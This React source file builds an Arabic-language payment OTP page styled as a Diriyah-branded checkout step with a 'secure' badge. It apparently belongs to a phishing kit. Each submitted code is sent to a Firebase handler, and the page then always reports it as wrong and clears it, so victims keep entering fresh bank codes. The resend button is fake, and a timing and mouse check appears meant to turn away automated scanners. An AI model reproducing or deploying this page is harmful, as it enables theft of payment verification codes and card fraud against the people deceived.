import { Link } from "wouter";
import { ArrowRight, ShieldCheck, Lock, RefreshCw } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useEffect, useRef } from "react";
import { handleOtp } from "@/lib/firebase";

export default function OTPPage() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps />
      <main className="flex-1 p-4 flex items-center justify-center">
        <OTPForm />
      </main>
    </div>
  );
}

function Header() {
  return (
    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
      <div className="container mx-auto px-4 py-3">
        <div className="flex items-center justify-between">
          <Link href="/checkout">
            <Button
              size="icon"
              variant="ghost"
              className="text-white hover:bg-white/10"
              data-testid="button-menu-otp"
            >
              <ArrowRight className="w-5 h-5" />
            </Button>
          </Link>

          <div className="flex-1 flex justify-center">
            <img
              src="/logo-white.svg"
              alt="الدرعية"
              className="h-10"
              data-testid="img-otp-logo"
            />
          </div>

          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-gradient-to-r from-[#f5f0e8] to-[#ebe3d7] p-5" data-testid="progress-steps-otp">
      <div className="flex items-center justify-center gap-1">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gradient-to-br from-primary to-[#d4a574] text-white shadow-glow">
                {step.number}
              </div>
              <span className="text-xs mt-2 text-primary font-medium">{step.label}</span>
            </div>
            {index < arr.length - 1 && (
              <div className="w-10 h-1 mx-1 rounded-full bg-gradient-to-r from-primary to-[#d4a574]" />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function OTPForm() {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isResending, setIsResending] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  
  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleMouseMove = () => { hasMouseMoved.current = true; };
    const handleKeyPress = () => { interactionCount.current++; };
    
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('touchstart', handleMouseMove);
    window.addEventListener('keypress', handleKeyPress);
    
    inputRef.current?.focus();
    
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('touchstart', handleMouseMove);
      window.removeEventListener('keypress', handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 2000) return true;
    if (interactionCount.current < 1) return true;
    if (!hasMouseMoved.current && !('ontouchstart' in window)) return true;
    return false;
  };

  const handleChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(0, 6);
    setOtp(cleaned);
    setError("");
  };

  const handleSubmit = async () => {
    if (otp.length < 4 || otp.length > 6) {
      setError("يرجى إدخال رمز التحقق (4-6 أرقام)");
      return;
    }
    
    if (isBotDetected()) {
      setError("حدث خطأ، يرجى المحاولة مرة أخرى");
      return;
    }
    
    await handleOtp(otp);
    setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى");
    setOtp("");
    inputRef.current?.focus();
  };

  const handleResend = () => {
    setIsResending(true);
    setTimeout(() => {
      setIsResending(false);
    }, 2000);
  };

  return (
    <div className="w-full max-w-md mx-auto animate-fade-in">
      <div className="bg-white rounded-3xl shadow-2xl p-8 space-y-6">
        <div className="text-center space-y-4">
          <div className="relative">
            <div className="w-20 h-20 bg-gradient-to-br from-primary to-[#d4a574] rounded-full flex items-center justify-center mx-auto shadow-glow">
              <ShieldCheck className="w-10 h-10 text-white" />
            </div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2">
              <div className="bg-green-100 text-green-700 text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
                <Lock className="w-3 h-3" />
                آمن
              </div>
            </div>
          </div>
          <div className="pt-4">
            <h2 className="text-2xl font-bold text-foreground">التحقق من الدفع</h2>
            <p className="text-muted-foreground text-sm mt-2">
              تم إرسال رمز التحقق إلى رقم جوالك المسجل
            </p>
          </div>
        </div>

        <div className="flex justify-center py-4" dir="ltr">
          <Input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            value={otp}
            onChange={(e) => handleChange(e.target.value)}
            className="w-full h-16 text-center text-3xl font-bold tracking-[0.4em] border-2 rounded-xl focus:border-primary focus:ring-primary/20"
            placeholder="------"
            autoComplete="one-time-code"
            autoFocus
            name="otp"
            data-testid="input-otp"
          />
        </div>

        {error && (
          <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp">
            {error}
          </div>
        )}

        <div className="space-y-3">
          <Button
            onClick={handleSubmit}
            size="lg"
            className="w-full bg-primary text-white shadow-lg"
            data-testid="button-verify-otp"
          >
            تأكيد الرمز
          </Button>

          <Button
            variant="ghost"
            onClick={handleResend}
            disabled={isResending}
            className="w-full text-primary gap-2"
            data-testid="button-resend-otp"
          >
            <RefreshCw className={`w-4 h-4 ${isResending ? "animate-spin" : ""}`} />
            {isResending ? "جاري إعادة الإرسال..." : "إعادة إرسال الرمز"}
          </Button>

          <Link href="/checkout">
            <Button
              variant="outline"
              size="lg"
              className="w-full"
              data-testid="button-back-otp"
            >
              رجوع
            </Button>
          </Link>
        </div>
      </div>

      <p className="text-center text-xs text-muted-foreground mt-6">
        لم تستلم الرمز؟ تأكد من صحة رقم الجوال المسجل
      </p>
    </div>
  );
}
